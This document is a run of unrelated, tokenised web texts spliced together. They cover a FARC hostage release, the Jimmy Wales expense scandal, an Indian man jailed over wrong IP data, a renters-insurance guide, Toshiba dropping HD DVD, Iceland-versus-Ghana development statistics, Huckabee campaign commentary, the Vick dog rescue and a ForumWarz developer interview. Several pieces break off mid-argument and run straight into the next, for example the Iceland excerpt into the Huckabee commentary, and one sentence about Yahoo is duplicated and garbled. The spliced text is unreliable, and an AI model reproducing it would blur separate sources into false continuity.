The FARC has been fighting for more than four decades for a more equitable distribution of wealth in Colombia , but has in recent years drawn wide reproach for its methods :
It kidnaps civilians for ransom and funds itself largely through cocaine trafficking .
Colombia 's government says it holds more than 700 people , either for ransom or political reasons .
Colombian President Alvaro Uribe , who has tense relations with Chavez , thanked the socialist leader and called for the release of all hostages .
He said Colombia is still in a fight " against terrorist actions " but is open to reconciliation .
The rebels have an ideological affinity with Chavez and have turned to him as their preferred facilitator .
Chavez said he hopes the hostage release , the second by the FARC this year , will open the way for a peace process .
His government dubbed Wednesday 's mission " Operation Path to Peace . "
Venezuela dispatched two helicopters to Colombia 's southern jungles , where the rebels turned over the four captives in the same region where they released two others on Jan. 10 : Clara Rojas and Consuelo Gonzalez .
In a video of the handover , officials spotted the captives awaiting them on a rise in a clearing .
The hostages wept as they hugged those sent for them .
Polanco received wildflowers from a female guerrilla and sobbed " thank you , thank you . "
Two of Polanco 's three sons were kidnapped together with her and later released in 2004 after a ransom was paid .
Her husband was later murdered , allegedly by the FARC .
As she held the flowers , she said : " I will lay these flowers at my husband 's grave , and another stem for each one of my sons . "
The video was broadcast by the Caracas - based TV channel Telesur .
A guerrilla commander who spoke in the video was asked if the group was bombed by the Colombian military .
He said that after his group received the hostages , no .
" But yes , troops were very close and that prevented them from being freed much earlier , " he said .
The operation was overseen by the International Committee of the Red Cross , and the rebels turned over the four to Venezuela 's interior minister , Ramon Rodriguez Chacin , and Colombian Sen. Piedad Cordoba , a close Chavez collaborator .
Once the four landed in Caracas to emotional family reunions , they focused on calling for a quick effort to free more captives .
Polanco 's three grown sons ran toward the plane , wearing T - shirts reading : " Freedom for all . "
Another of the freed hostages , former Sen. Luis Eladio Perez , said he last saw Betancourt on Feb. 4 and that she was in very poor shape .
" It 's a question of time .
We need to take immediate action to obtain Ingrid 's liberation , " he said .
" I do n't know how I managed to survive , " Perez added .
" I had a heart attack , three diabetic comas .
I 've had all the tropical diseases there are . "

Wikipedia founder Jimmy Wales did n’t have such a good weekend .
First the blogosphere and then Wikipedia itself lit up with news of his messy breakup with controversial Canadian TV pundit Rachel Marsden .
Now , accusations are flying that Wales has been living the high life on the expense account of the nonprofit foundation he created .
On Friday , reports surfaced that the married - but - divorcing Internet icon carried on a clandestine affair with Marsden .
Evidence of the affair included lurid IM transcripts , which appeared on Silicon Valley gossip blog Valleywag .
On Saturday , Wales posted a statement on the Wikipedia Foundations website ( which he later moved to his personal site ) denying that his actions went against Wikimedia Foundation ’s policies , and stating that the affair had ended .
Marsden responded by listing the clothes that he left at her house up for auction on eBay .
So , what ’s the big deal when a relationship goes sour ?
Well , the two met when Marsden contacted Wales to help her “ clean up ” what she perceived to be errors on her personal Wikipedia page , and there have been allegations that Wales used his influence to improperly make changes .
Former associates of Wales ’ are using this scandal to bring up other worries they have about the organization of the foundation .
Former Wikimedia exec Danny Wool , who left the foundation last year , wrote a blog post insinuating that Wales used the non-profit foundation as his own personal piggy bank .
Expenses that Wales tried to apply to the foundation included $ 300 + bottles of wine and visits to Moscow massage parlors , Wool alleges .
According to Wool , the expenses got so out of hand that the Wikimedia foundation took away Wales ’ corporate credit card .
“ There were occasions where he used [ the Wikimedia Foundation ] for personal advancement under the guide of the mission .
And , as someone who was in there for the mission part of it , I found that rather distressful , ” Wool told EPICENTER .
Wales did not immediately respond to a request for comment .

Man Jailed For 3 Weeks Over Wrong IP Info Thanks , ISP !
Thanks , Oppressive government !
An Indian man was jailed for three weeks after his ISP handed over IP address information claiming he'd posted images to Orkut that insulted Chhatrapati Shivaji , a revered historical figure .
According to CNet , Indian authorities tracked down the IP address thanks to Google , then headed to Indian ISP Airtel , who handed over the wrong name .
Lakshmana Kailash K. , a 26 - year - old techie , subsequently spent three weeks behind bars .
CNET ties this into a broader picture by noting that a U.S. law is being proposed that would prohibit any U.S. Internet company from giving authorities in countries that restrict free speech info that " personally identifies a particular user ... except for legitimate foreign law enforcement purposes as determined by the Department of Justice . "
That law , of course , is a response to Yahoo's " spineless " ( in the words of That law , of course , is a response to Yahoo 's ( in the words of Congress ) cooperation with Chinese authorities in the jailing of political dissidents .

We chide other countries for trampling the rights of it 's citizens , yet we are more than amply guilty of the same thing .
Does anyone not recall that legislation that Bush pushed ( and was ruled unconstitutional by the Supreme Court ) , that made Google and Yahoo hand over search results to the government ?
Bush claimed that people were looking at child pornography and so the government needed all search data to determine what people were accessing .
Do n't believe me , look this one up .
Couple this with the fact of our grand old NSA wiretapping , the Patriot Act , Gitmo where we lock people up with no trial , and frankly , WE HAVE NO ROOM to talk .
We 're the pot calling the kettle black .
Hard to shout that another country is violating people 's Democratic Rights when we can't even respect our own citizens or follow the letter of the law here .
If your home burned to the ground and you lost every single one of your worldly possessions , how much would it cost you to replace them all ?
You ’d need an entirely new wardrobe , all new furniture , new electronics such as TVs and computers , new artwork and decor .
New bicycles , new stereo equipment , new kitchen gadgets , cookware , utensils .
For most of us , the cost to replace our belongings would easily total $ 10,000 or more .
In other words , not an amount you could shrug off and take in stride .
Enter : renters insurance .
It ’s a bit of a misnomer because this type of policy is actually personal property insurance , covering most of your belongings whether they ’re inside your home or not .
But insurance companies call it renters insurance to differentiate from homeowners insurance , which includes both personal property and the structure itself .
Everyone should have personal property insurance at all times .
The good news is that it ’s surprisingly affordable , typically costing between $ 5 and $ 20 per month depending on your coverage .
Basics of Renters Insurance
A renters insurance policy through a company like Lemonade works much like a home or auto insurance policy .
You select a coverage level and a deductible , and then pay the premium , whether monthly , semiannually , or annually .
Should anything happen to your belongings , such as theft , fire , or water damage from the sprinklers , you can file a claim .
The insurance company pays you to help cover the cost to replace your belongings after you pay your deductible .
Beyond replacing your personal belongings , renters insurance can also pick up the tab for other home - related costs .
If someone falls on your steps and sues you for their medical bills , some renters insurance policies cover them .
If you have to move out of your home after a fire , many policies cover the cost of a hotel room .
Some even cover your moving expenses if you have to move permanently as a result of a disaster .
As with all insurance policies , you get what you pay for .
A cut -rate renters insurance policy usually offers only minimal coverage combined with a high deductible .
Still , depending on your situation , you may only need the most basic coverage .
Actual Cash Value vs. Replacement Cost
Insurance companies sell renters insurance based on either the actual cash value of your possessions or their replacement value .
Both policies work the same in principle , but have very different results when it comes to paying out a claim .
Actual Cash Value .
If you file a claim on an actual cash value policy , the insurance adjuster looks at the damage to your belongings and then deducts the cost of depreciation before offering you a claim amount .
For example , the laptop you bought for $ 1,800 five years ago is only worth $ 300 today due to depreciation .
If a fire destroys your laptop and you file a claim for it , the insurance company compensates you only for today ’s value : $ 300 .
It does n’t matter that you ’d likely have to spend another $ 1,800 on a new , up - to - date machine .
Therefore , actual cash value policies tend to charge lower premiums than their counterpart , replacement value policies .

Replacement Value .
On a replacement value plan , the insurance company will pay you the actual cost to replace your items .
In other words , if the $ 1,800 laptop you bought five years ago burns in the fire , the insurance company compensates you $ 1,800 or however much it costs to buy a similar laptop new today .
This type of plan typically comes with higher premiums , but proves well worth it if you ever have to file a claim .
What Most Renters Insurance Covers
All renters insurance covers your personal property to some extent or another .
That goes for property outside your home , not just items that permanently sit inside it .
So if someone steals your backpack with your laptop inside while you ’re out and about , it ’s generally covered by renters insurance .
Renters insurance policies typically cover not just your individual belongings , but those owned by everyone in your immediate live - in family .
Your spouse ’s and 5 - year - old kid ’s clothes are covered .
Your live - in girlfriend ’s clothes , or stuff left by your adult child who finally moved out ?
Not so much .
Nearly all renters insurance policies protect against the following common threats .
Make sure you understand exactly what ’s included and excluded in any given policy before committing .
Fire Damage
All renters insurance policies cover fire damage .
It makes up the core coverage of all property insurance .
If an electrical fire burns your home to the ground , you ’re covered .
The same goes for just about any accidental fire .
Fires deliberately lit as arson may not be covered , however .
Most renters insurance policies cover wildfire damage as well .
Not all do , however , as some insurers classify wildfires as a “ natural disaster ” — more on that distinction later .
Smoke Damage
Likewise , nearly all renters insurance policies include damage from smoke in their coverage .
Smoke can quickly ruin clothes , linens , and fabric - covered furniture , even if the flames get nowhere near them .
Damage Caused by Discharged Water
When a fire or malfunction triggers the sprinkler system , it can ruin every item in your home in a matter of seconds .
Electronics shorted .
Clothes and furniture water - stained or even moldy .
Your mattress waterlogged .
Few personal belongings can stand up to sustained water drenching .
In most cases , this coverage includes burst pipes or other plumbing mishaps .
It does not include flood damage , however — more on that later .
“ Normal Storms ” as Named Perils
Renters insurance policies list out named perils as inclusions , and they usually list various types of “ normal ” storms among them .
That typically includes windstorms , lightning , hail , and even not - so - normal events like tornadoes and volcanic eruptions .
Although if you live in a tornado alley or on the brim of an active volcano , read the fine print carefully to make sure these disaster types are included .
If a thunderstorm knocks a tree branch into your living room and crushes your TV , it ’s almost always covered .
Theft
Whether a home burglary or someone stealing your smartphone out of your hand on the street , renters insurance covers theft .
In the case of the latter , however , your deductible may be higher than the cost to replace your phone .
If someone steals your valuables , you ’re covered .
Vandalism
The same goes for vandalism .
If someone intentionally ruins your belongings , your renters insurance policy nearly always covers the damage .
Optional Extra Coverage
Beyond the basics included in most renters insurance , you can also opt for additional coverage .
Not everyone needs it , but depending on your possessions and risk tolerance , you may want to include it .
Specific Valuables
The $ 50 necklace you bought at the department store is covered if your home burns down .
Your $ 20,000 engagement ring ?
That ’s another story .
Most renters insurance policies put a value limit on jewelry included by default under their coverage .
For jewelry worth more than that , you typically need to buy additional coverage .
The same goes for artwork and other valuable objects .
Your policy covers your belongings up to a certain limit , but if you own a famous painting worth $ 50,000 , do n’t expect your renters insurance policy to include it without specific coverage .
Temporary Living Expenses
A fire renders your apartment uninhabitable , which means you need to find somewhere else to live until your landlord can complete repairs .
Some renters insurance policies include temporary living expenses if you cannot stay in your home for a time .
That could mean paying for a hotel , a hotel alternative like an Airbnb accommodation , or perhaps furnished corporate housing .
Relocation Expenses
Landlords can’t always repair damaged rental properties quickly , or at all .
The building could burn to the ground , or require a complete gut and renovation .
In that case , you do n’t need temporary accommodations .
You need a new place to live .
Many policies include moving expenses you incur if you ’re forced to find a new home after yours is destroyed .
Liability & Medical Expenses
Unfortunately , we live in a litigious society , and some people do n’t hesitate to sue if they see a chance at a quick score .
Some renters insurance policies include liability coverage , often combined with medical coverage , in the event that someone gets hurt and blames you .
For example , if your dog attacks the neighbor ’s child , they could sue you for the medical expenses and damages .
Renters insurance can cover that .
Or imagine another scenario , where you throw a party and someone gets hurt .
Or you accidentally start a fire that spreads to your neighbor ’s home and damages their belongings .
Note that this medical expense coverage does n’t replace your own health insurance plan .
It covers other people ’s medical bills if they try to blame you .
Similarly , it does n’t cover liability for damage caused by car accidents .
That falls under your auto insurance policy .
Natural Disasters
There are thunderstorms , and then there are hurricanes .
Renters insurance generally covers normal storms , but not natural disasters — at least not without additional coverage .
Natural disasters include such calamities as earthquakes , hurricanes , and sinkholes .
If you worry about damage from disasters , ask your insurance provider about added coverage .
Flood Damage
Renters insurance does not cover flood damage without additional coverage .
They do cover plumbing - related water damage , such as burst pipes or triggered sprinklers .
But if water enters your home via flooding , insurance does n’t cover the damage unless you buy specific flood insurance .
Do your homework to research whether your home sits in a flood plain .
You can do so at FEMA ’s SmartFlood website , the official site of the National Flood Insurance Program .
Identity Protection
In today ’s digitized economy , your personal financial information exists on so many websites that sooner or later , at least some of it is bound to get captured by identity thieves .
Yes , you should take identity theft prevention seriously .
But you should also consider insuring against it because an incident can get very , very expensive .
You can buy standalone identity theft insurance if you like .
But it ’s generally cheaper to include it under your renters insurance as additional coverage .
What Renters Insurance Never Covers
Some renters discover only after disaster strikes that their insurance did n’t cover everything they thought it did .
Beyond the optional inclusions outlined above — that often are n’t included in policies by default — some items are never covered by renters insurance .
Make sure you understand these before making false assumptions about your coverage .
Fixtures Owned by the Landlord
Any property fixtures owned by the landlord fall under their landlord insurance policy , not your renters insurance policy .
For example , landlords typically own and provide many large appliances such as refrigerators and ovens .
Likewise , they may let you use their grill in the backyard , but they may opt not to replace it after it gets stolen or destroyed .
This loss would not be covered under your renters insurance .
If you brought your own appliance , however , that does typically fall under your renters insurance coverage .
Undocumented Items
You should be able to provide proof of ownership for any belongings when you make a claim .
Otherwise , anyone could claim any item under the sun after a fire , hoping to pull one over on the insurance company .
Keep copies of your receipts for all valuable belongings .
No , you do n’t need to keep a receipt for every $ 15 T - shirt you buy .
But that new TV you just bought for $ 1,500 ?
Do n’t expect your claims adjuster to take your word for it .
You can keep paper receipts in a fire - proof safe as one option .
Better yet , just snap a quick photo with your phone and save it to a digital folder on your computer .
Ideally , combine that with a cloud backup service , so that if your computer also perishes in the fire , you have a copy ( along with all your other important documents and files ) .
Pet Veterinary Care
Renters insurance does not cover your pets , aside from possibly covering your liability for pet attacks .
If your pets get injured in a fire or storm , you must pay for their veterinary care out of pocket .
You can buy separate pet health insurance .
The same insurer may offer you both policies , but they remain distinct .
Your Roommate ’s Belongings
Your renters insurance covers only your and your immediate live - in family ’s possessions .
It does not cover other people ’s belongings — even if they live under the same roof .
That goes for housemates and for cohabitating couples .
Getting legally married comes with many perks , joint insurance coverage among them .
Motorized Vehicles
Say you have $ 1,500 worth of personal belongings in your car , and someone steals your car .
What are the insurance ramifications ?
You would have to file two claims : one with your auto insurance company for the car itself , and one with your renters insurance company for the belongings inside it .
Renters insurance cannot cover motorized vehicles .
Beyond cars , trucks , and motorcycles , that also extends to mopeds , electric bicycles , Segways , and motorized scooters .
Pest Damage
If mice eat through your wardrobe , chewing up every article of clothing you own , do n’t expect your renters insurance to cover it .
Damage by pests falls outside your renters insurance coverage .
That goes for everything from rodents to cockroaches , ants to termites and any other creepy - crawlies that find their way into your home .
Consider it extra incentive to keep your home spick and span !
Cost of Renters Insurance
As insurance goes , rental insurance is downright cheap .
According to the Insurance Information Institute , the average annual insurance premium costs only $ 180 .
That ’s only $ 15 a month ; some video streaming services cost more than that .
Some insurers , especially online insurance companies , average even lower premiums .
The average entry - level renters insurance from Lemonade is only $ 5.70 per month , for example .
Granted , premiums vary based on both the amount of coverage and the deductible .
If you want to cover $ 100,000 in personal property rather than $ 10,000 , expect to pay a significantly higher premium .
Likewise , if you want a $ 200 deductible rather than a $ 1,000 deductible , prepare to pay for it .
As with every type of insurance , make sure you shop around .
Some providers offer better bargains with more coverage than others , and rates change all the time .
Do your homework , and find affordable coverage that meets your needs .

Unlike many forms of insurance , you do n’t need to submit much information to get a quote on renters insurance .
Most providers offer an instant quote online .
Expect to submit your name , address , phone number , details about any pets you own , whether you live with roommates , and possibly characteristics of your home such as the number of smoke detectors , whether it has a security system , and so on .
Insurance companies may also ask for your Social Security number .
Based on statistical data , insurance companies classify certain breeds of dogs as more dangerous than others .
Pet liability coverage for these dogs may drive up your premium .
Living with a roommate may also drive your premium higher , as it adds another variable .
You then select how much coverage you want , the deductible you want , and any optional inclusions you want .
Then voila !
You get an instant quote .
Filing a Claim
Most modern insurance companies let you file a claim online , although they also offer claims by phone .
Have your policy number handy so they can identify your account .
When you file a claim , be prepared to provide documentation for any significant items you want included .
Usually that means a receipt , so keep copies ( digital or paper ) of these in a fireproof location , ideally in cloud storage .
If it costs more than $ 50 or $ 100 and you want it replaced , prepare to prove ownership .
Most companies process renters insurance claims quickly .
In some cases , they pay out in a matter of days .
Slower companies typically pay within a few weeks — another example of why you need an emergency fund .
Final Word
As with any type of insurance , shop around .
Request a quote from several insurance companies and ask the insurance agent about available discounts and exactly what each policy covers .
Many companies offer discounts for customers who carry multiple policies , such as auto and renters .
You may also score discounts if you have or agree to install a home security system , deadbolt locks , smoke detectors , and sprinkler systems in your home .
Most importantly , you do n’t want to pay for coverage you do n’t actually need .
Check your lease to understand exactly what your landlord is responsible for repairing or replacing in your rental .
Moreover , your landlord ’s property insurance should already cover certain damages to the exterior and structure of the home .
When in doubt , start with entry - level coverage .
You can always raise your coverage later , so start small and increase it only as needed .
Do you have renters insurance ?
If not , what ’s stopping you ?

Toshiba Announces Discontinuation of HD DVD Businesses
19 February , 2008
Company Remains Focused on Championing Consumer Access to High Definition Content TOKYO -- Toshiba Corporation today announced that it has undertaken a thorough review of its overall strategy for HD DVD and has decided it will no longer develop , manufacture and market HD DVD players and recorders .
This decision has been made following recent major changes in the market .
Toshiba will continue , however , to provide full product support and after - sales service for all owners of Toshiba HD DVD products .
HD DVD was developed to offer consumers access at an affordable price to high - quality , high definition content and prepare them for the digital convergence of tomorrow where the fusion of consumer electronics and IT will continue to progress .
" We carefully assessed the long - term impact of continuing the so - called ' next - generation format war ' and concluded that a swift decision will best help the market develop , " said Atsutoshi Nishida , President and CEO of Toshiba Corporation .
" While we are disappointed for the company and more importantly , for the consumer , the real mass market opportunity for high definition content remains untapped and Toshiba is both able and determined to use our talent , technology and intellectual property to make digital convergence a reality . "
Toshiba will continue to lead innovation , in a wide range of technologies that will drive mass market access to high definition content .
These include high capacity NAND flash memory , small form factor hard disk drives , next generation CPUs , visual processing , and wireless and encryption technologies .
The company expects to make forthcoming announcements around strategic progress in these convergence technologies .
Toshiba will begin to reduce shipments of HD DVD players and recorders to retail channels , aiming for cessation of these businesses by the end of March 2008 .
Toshiba also plans to end volume production of HD DVD disk drives for such applications as PCs and games in the same timeframe , yet will continue to make efforts to meet customer requirements .
The company will continue to assess the position of notebook PCs with integrated HD DVD drives within the overall PC business relative to future market demand .
This decision will not impact on Toshiba 's commitment to standard DVD , and the company will continue to market conventional DVD players and recorders .
Toshiba intends to continue to contribute to the development of the DVD industry , as a member of the DVD Forum , an international organization with some 200 member companies , committed to the discussion and defining of optimum optical disc formats for the consumer and the related industries .
Toshiba also intends to maintain collaborative relations with the companies who joined with Toshiba in working to build up the HD DVD market , including Universal Studios , Paramount Pictures , and DreamWorks Animation and major Japanese and European content providers on the entertainment side , as well as leaders in the IT industry , including Microsoft , Intel , and HP .
Toshiba will study possible collaboration with these companies for future business opportunities , utilizing the many assets generated through the development of HD DVD .

How La Niña could impact world weather
Meteorologists have declared there is a La Niña event in the tropical Pacific .
But what does that mean for the world ’s weather ?
Chris Fawkes has more .
Honey bees are dying in vast numbers and nobody knows exactly why .
As honey bees are responsible for pollinating a third of the crop species in the US alone , this phenomena , called Colony Collapse Disorder , is potentially very bad news for everyone .
" Vanishing of the Bees " is an independent documentary currently in production about this ecological nightmare and its potential impact .
The trailer is beautiful , provocative , and deeply moving .
I hope the filmmakers gather the funds to complete the full movie .

Thorvaldur Gylfason " assesses African development prospects using Iceland ’s economic ascent over the last century as a benchmark " :
When Iceland was Ghana , by Thorvaldur Gylfason , Vox EU : Believe it or not : in 1901 , Iceland ’s per capita national output was about the same as that of Ghana today .
Today , Iceland occupies first place in the United Nations ’ ranking of material success according to the Human Development Index that reflects longevity , adult literacy , and schooling as well as the purchasing power of peoples ’ incomes .
Can Iceland ’s rags - to - riches story be replicated in Africa and elsewhere in the developing world ?
If so , what would it take ?
Grandmother - verifiable statistics
In 1901 , my grandmother was twenty - four .
She had six children , as was common in Iceland at the time , even if the average number of births per woman had decreased from almost six in the early 1850s to four around 1900 , like in today ’s Ghana .
In fact , the number of births per woman in Iceland was four in 1960 , so Iceland and Ghana are separated in this respect by a half - century or less .
It took Ghana less than fifty years , from 1960 to date , to reduce the number of births per woman by three , from almost seven to four .
It took Iceland a century and a half , from the late 1850s to date , to reduce the number of births per woman by three , from five to two ( or 2.1 to be precise , the critical number that keeps the population unchanged in the absence of net immigration ) .
True , Ghana has made more rapid progress on the population front than many other African nations .
The average number of births per woman in Sub-Saharan Africa has decreased from 6.7 in 1960 , as in Ghana , to 5.3 in 2005 .
These averages , however , mask a wide dispersion in fertility across countries .
Mauritius is down to two births per woman compared with almost six in 1960 .
Botswana is down to three , from seven in 1960 .
The women of Kenya , Tanzania , and Uganda now have five , six , and seven children each on average compared with eight , seven , and seven in 1960 . [ 1 ]
Goodbye to short lives in large families
The point of this comparison of demographic statistics is that social indicators often provide a clearer view than economic indicators of important aspects of economic development .
Moreover , several social indicators of health and education – fertility , life expectancy , literacy , and such – are readily available for most countries and in some cases reach farther back in time than many economic statistics .
Fertility matters because most families with many children cannot afford to send them all to school and empower them to make the most of their lives .
Families with fewer children – say , two or three – have a better shot at being able to offer a good education to every child , thus opening doors and windows that otherwise might remain shut .
Reducing family size , therefore , is one of the keys to more and better education and higher standards of life .
As Hans Rosling has pointed out very vividly , short lives in large families are no longer a common denominator in developing countries . [ 2 ]
Around the globe , including in many parts of Africa , there is a clear trend toward smaller families and longer lives .
In Ghana , for example , life expectancy at birth has increased by more than three months per year since 1960 , from 46 years in 1960 to 58 years in 2005 .
In Sub -Saharan Africa on average , all 48 countries included , life expectancy increased less rapidly , from 41 years in 1960 to 47 years in 2005 .
Average life expectancy is now on the rise again in Africa , having reached a peak of 50 years in the late 1980s and then decreased mostly on account of the HIV / AIDS epidemic .
Iceland ’s economic history through African eyes
Let us now return to Iceland and briefly trace its economic history since 1901 through African eyes , as it were .
In 1901 , Iceland ’s Gross Domestic Product ( GDP ) per capita was about the same as that of Ghana today , measured in international dollars at purchasing power parity .
This observation , illustrated in Figure 1 , follows from two simple facts :
So the latest polls have Mike Huckabee up an implausible nineteen points in Iowa and four points nationally .
But he can't win , right ?
I mean , he 's vulnerable on practically every non-social issue , he has a variety of skeletons in his closet , his policy team seems more or less nonexistent , he still does n't have any money , and he has most of the GOP establishment united against him .
He does n't have a prayer - or maybe that 's all he has .
Except , of course , that none of his rivals can win either .
If you look at the field , every candidate seems to have near - disqualifying weaknesses ( a point Larison has been making for months , I believe ) , which helps explain why nobody seems capable of getting above 30 - 35 percent in any national or state - level poll .
McCain is still poison to a large chunk of the base and probably does n't have enough money to capitalize even if he wins New Hampshire - and if he loses there , he 's cooked .
Mitt Romney is running on a record that would have made him a moderate Democrat in any state except hyper-liberal Massachussetts .
Rudy Giuliani is running on a record that would have made him a moderate Democrat in any place except hyper-liberal New York City .
Fred Thompson is more ideologically appropriate , but he 's lived down to his lackluster record as a politician by running a remarkably lousy and ( perhaps unremarkably ) lazy campaign .
Ron Paul is , well , Ron Paul .
Note that I 'm not saying the Republican field is weak , exactly .
In a certain sense , it 's the most accomplished primary field of any major party in a long time ; indeed , you could argue that almost all the GOP candidates ( including Huckabee ) have more impressive resumes than the three leading Democrats , who between them can boast about ten years in the Senate and the weird quasi- accomplishment of being First Lady .
It 's just that ideologically - speaking , none of the Republican contenders make nearly as much sense as candidates for the nomination of the present - day GOP as Obama , Clinton and Edwards do as candidates for the nomination of the present - day Democratic Party .
This probably explains why Democratic voters are happier with their candidates than Republicans ; it also may help explain why the leading Republicans poll better in general - election matchups than you 'd expect , given that 2008 looks poised to be a Democratic year .
Say what you will about Mitt Romney , Rudy Giuliani , and John McCain , but judged purely on their accomplishments in life , they 're much more impressive figures than , say , a Barack Obama .
( And I find Obama 's accomplishments impressive ! )
I do n't expect that general - election voters will judge on resumes alone , which is why I expect the Democrats to take the White House .
But it 's worth keeping this discrepancy in mind once one of the candidates who can't possibly win the GOP nomination actually does .
We want to hear what you think about this article .

The government agreed to give them a second chance after Mr. Vick agreed to pay $ 928,073 for evaluation and care of all the dogs .
They were seen by animal experts , who named the dogs , and were eventually dispersed to eight rescue organizations for adoption , rehabilitation or lifetime care in sanctuaries , where they have been neutered .
Only one of the Vick dogs was euthanized for aggression against people .
Best Friends , which is caring for more dogs than any other organization , received about $ 389,000 .
Many of their dogs are expected to be adopted after they are rehabilitated and matched with the right families .
Vick ’s 25 other dogs are in foster care all over the country .
“ This is a great opportunity to highlight the fact that the victims in the case are the animals themselves , ” said Rebecca J. Huss , a Valparaiso University law professor , animal law expert and court - appointed guardian for Vick ’s dogs .
Bay Area Doglovers Responsible About Pitbulls , or BAD RAP , which helped evaluate the dogs , has 10 in foster care .
Donna Reynolds , the group ’s executive director , said , “ There are dogs that are able to handle and survive the past with a good attitude , then ones that are going to be shut down and not take it anymore .
“ Best Friends got the dogs that pretty much are n’t going to do so well , ” she added , noting that those dogs included the known fighters and Mr. Vick ’s champion pit bull , Lucas , who , by court order , will live out his days at the sanctuary .
Once Abused , Now Pampered
Life at Best Friends is nothing like it was at Mr. Vick ’s property on Moonlight Road in Smithfield , Va. , where many of the dogs were found chained to buried car axles .
They slept on concrete .
Their water , if any , was kept in algae - covered bowls .
Most were underfed .
Some showed recent lacerations .
Here , they live in a 3,700 - acre sanctuary that is covered by juniper trees and sagebrush , and surrounded by canyons and red-rock formations .
They have food called Canine Caviar , squeaky toys , fluffy beds and four full - time caregivers .
The caregiver on the night shift curls up with the dogs for naps .
Who can forget Ajman 's most famous resident , the one - legged Bluebeard Daad Mohammed Murad who has already worked his way through fifteen different wives in his absurd quest to have one hundred children ?
When we last met Daad in 2005 , he was about to take his twelfth wife and was up to 68 children .
In the past two years he 's squired another ten offspring and shed three more brides .
And he 's looking for more : A Baluchistani belle has already been lined up .
And now Daad is off to Jaipur to pick up an artificial leg and a " beautiful Rajasthani girl " .
Seventeen wives , 78 children ( soon to be eighty ) , 49 grandchildren , 15 houses and Dh1,000 of mutton a day .

ForumWarz is my newest obsession , a web - based game like nothing I ’ve ever played .
In short , it ’s a parody of Internet culture in the form of a real - time role - playing game .
You play as one of three Internet archetypes — the camwhore , emo kid , or troll — and try to disrupt message boards any way you can , using your sexuality , bad poetry , cross - site scripting attacks , or simply banging your head on the keyboard .
In the process , you ’ll meet a large cast of strange characters who will send you on missions in a very funny microcosm of the Internet .
Among those parodied : Furries , Google , script kiddies , Boing Boing , Apple Computer , ricers , 4 chan , Ron Paul , gamers , Bill O’Reilly , Tubgirl , otaku , and the Church of Scientology .
Also , it ’s almost certainly the only game to include a text - adventure minigame based on R. Kelly ’s “ Trapped in the Closet . ”
This game is n’t for everyone .
Before reading any further , I ’d highly recommend trying the first two or three levels .
Warning :
If you ’re easily offended , this game is not for you .
And do n’t worry about getting stuck with the Jimmy character during the tutorial ; you get to choose a username , avatar , and class when you hit level 2 .
I interviewed Robin Ward aka “ Evil Trout , ” ForumWarz ’s developer / designer and only full - time employee , to learn more about the history and making of the game .
Andy Baio : Listen , I want to start by telling you that I ’m absolutely blown away by ForumWarz .
Brilliantly executed , addictive , sheer fun .
Robin Ward :
Thanks , that means a lot to me .
When I first came up with the idea , Jalapeno and I spent a little time looking at other web RPGs .
And I could n’t believe how obtuse some of them were .
There was one , I honestly forget which one , that said “ The best way to get started is to read our wiki . ”
And I thought that was ridiculous , as if someone is going to sit down and read through a wiki before playing .
Is it just you and Mike “ Jalapeno Bootyhole ” Drach ?
We actually incorporated recently , and there are four of us in the corporation .
But the majority of the work is done by Drach and I .
I work on it full time , and Drach has taken vacation time to work on it .
The others are more casual , we have weekly meetings and we bounce ideas off each other .
Sentrillion , the in - game search engine Sentrillion , the in - game search engine
I read you worked on it for over a year , and then three months in beta ?
I saw the original announcement on your blog from just over a year ago .
Yup .
I first came up with the idea in September 2006 .
I was working full time at that point , and started learning Ruby on Rails .
Drach is a great friend of mine , as is Jason Kogan , and we ’d meet weekly to discuss and work on it .
And quickly I started to notice that I was having a lot more fun working on it than I was my real job .
And I ’d lie there at night , thinking “ Wow , would n’t it be awesome if I could work on Forumwarz full time ? ”
And then I looked at my financial situation — I ’d managed to save up a bunch of money working as a developer , so I crunched some numbers , figured out a way to live really cheaply , and quit my job .
So I did that Jan 1 , 2007 .
I worked on it full time throughout the year , with Mike ’s help when he took his vacation in the summer , then released Episode 1 in Beta on Halloween .
Then we launched proper a couple of weeks ago , in early February .
You ’re the primary developer / designer and Drach writes …
What do the others do ?
We ’re all friends , who I ’ve known since high school ( and in Jason ’s case , grade school ) .
So it was mostly an excuse to get together and throw around ideas .
Sometimes it ’s nice to just have people to bounce ideas off .
Jason was great at giving UI feedback , like why did you put that button there , that makes no sense , etc .
And the meta - game , Domination , is basically his baby .
The fourth member , who is n’t so active any more since he had a child , is David Kalechstein .
When he was laid off , he wanted to learn Rails and wrote a little bit of code for ForumWarz .
( Mainly in displaying our leaderboards . )
We used to drink beer and go out for dinner at every meeting , but after a couple of months that got expensive and unproductive
Beer and meetings do n’t mix .
Hah , generally not .
Your influences are all over the map .
The name ’s derived from classic BBS doors like TradeWars and Pimp Wars ?
Yup , very few people get that actually .
In terms of the turn - based gameplay and visits per day idea , that came from a door called LORD , Legend of the Red Dragon .
We wanted a name that reflected that .
It was actually Drach ’s idea to get ForumWarz , he ’s the one who looked it up .
Were you involved in the BBS scene ?
I never ran a BBS , but I was super addicted to them growing up .
Of course when the Internet came around I jumped ship , but I ’ll always have a soft spot in my heart for them .
When I was young , I ’d come home from school and just start dialing up .
LORD started in 1989 , so I ’m going to guess you came into the scene the same time I did around the late ’ 80s , early ’90s ?
Yeah , that ’s about right .
I think I got my first modem when I was 8 years old , which would be 1987 .
A lot of the influences in ForumWarz are from that time period .
I was in love with LucasArts games , and we stole a lot from them , I think .
Like breaking the fourth wall , the conversation trees .
Also , my favorite parody RPG of all time , Superhero League of Hoboken , came out then .
Trapped in the Cupboard mini -game Trapped in the Cupboard mini-game
There ’s also quite a bit of text adventure influence in ForumWarz .
In the writing , but most obviously in the Trapped in the Cupboard minigame .
We knew very early on that we could n’t afford to make a visually flashy game , so writing was really important to focus on .
Mike Drach actually writes for children ’s cartoons , and I ’ve known him since high school and have always thought he was hilarious but had never had an opportunity to truly apply it .
Trapped in the Cupboard exists more because I thought it would be a fun project to port Z- machine ( the virtual machine that runs the old infocom games ) to an Ajax interface .
I started doing that for a day or two as a break from ForumWarz coding , and quickly realized it was far more complicated than what I needed .
So I scrapped it , and came up with my own Ruby pseudo - DSL .
I wish I could brag that I pulled that off . 🙂
You ’ve also mentioned the obscure Sierra game Jones in the Fast Lane as an influence .
Ah yes , I would n’t advocate piracy , but it ’s not too hard to get from abandonware sites .
It ’s basically impossible find in stores , even online ones .
One question I am asked often is why would you make a game about a mundane thing like the Internet ?
Jones is my biggest influence for that , because it ’s the first real life simulator I played .
When I first started trying to describe ForumWarz to friends and on my site , I realized how futile it was .
It ’s impossible to explain what it is .
